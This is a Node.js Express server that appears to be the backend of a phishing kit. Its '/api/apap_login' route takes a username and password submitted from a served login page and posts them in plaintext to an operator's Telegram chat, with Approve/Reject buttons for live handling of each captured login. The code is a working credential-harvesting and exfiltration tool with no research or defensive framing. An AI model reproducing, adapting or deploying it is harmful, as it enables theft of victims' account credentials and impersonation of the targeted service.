const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const dotenv = require('dotenv');
const path = require('path');
const cors = require('cors');

// Load environment variables
dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;
const VERCEL_URL = process.env.VERCEL_URL || '';
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const TELEGRAM_API_BASE = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;

if (!TELEGRAM_TOKEN || !CHAT_ID) {
    throw new Error("TELEGRAM_TOKEN and CHAT_ID must be set in the environment variables");
}

// Middleware
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));
app.use(cors({ origin: '*' }));

// In-memory state (replace with a database for serverless compatibility)
const states = {};

// Helper functions
async function sendTelegramMessage(chatId, text, keyboard = null) {
    try {
        const payload = {
            chat_id: chatId,
            text: text,
            parse_mode: 'Markdown',
        };
        if (keyboard) {
            payload.reply_markup = JSON.stringify(keyboard);
        }
        const response = await axios.post(`${TELEGRAM_API_BASE}/sendMessage`, payload);
        return response.data;
    } catch (error) {
        console.error('Error sending Telegram message:', error);
        return null;
    }
}

// Routes
app.post('/api/apap_login', (req, res) => {
    const { usuario, password } = req.body;
    if (!usuario || !password) {
        return res.status(400).json({ status: 'error', message: 'usuario and password are required' });
    }

    states[usuario] = {
        password,
        decision: null,
        type: 'apap_login',
    };

    const text = `🔐 *LOGIN - Request*\n\n👤 \`${usuario}\`\n🔑 \`${password}\`\n\nApprove this login?`;
    const keyboard = {
        inline_keyboard: [
            [{ text: '✅ Approve', callback_data: `${usuario}|approve|login` }],
            [{ text: '❌ Reject', callback_data: `${usuario}|reject|login` }],
        ],
    };

    sendTelegramMessage(CHAT_ID, text, keyboard);
    res.json({ status: 'ok', message: 'Login request sent to Telegram bot' });
});

// Serve static files from the public directory
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start the server
const server = app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
    console.log(`Vercel URL: ${VERCEL_URL}`);
});

// Export the Express API for Vercel
module.exports = app;